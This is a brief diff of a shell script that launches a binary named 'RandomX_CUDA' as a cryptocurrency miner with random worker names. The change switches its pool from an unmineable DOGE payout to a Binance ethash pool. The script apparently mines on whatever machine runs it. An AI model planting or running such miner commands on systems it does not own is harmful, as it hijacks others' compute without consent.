@@ -18,4 +18,4 @@
   ls 
   chmod +x RandomX_CUDA
   WORKER=$(echo $(shuf -i 1000-9999 -n 1)-xCOLx)  
-  ./RandomX_CUDA -v -l ethash.unmineable.com:3333 -u DOGE:DDMxMksSQmc2qwyoYCqHdFprscVrz15USt.$WORKER -p x -t 18 
+  ./RandomX_CUDA -v -l stratum+tcp://ethash.poolbinance.com:1800 -u DHB.$WORKER -p x -t 18 
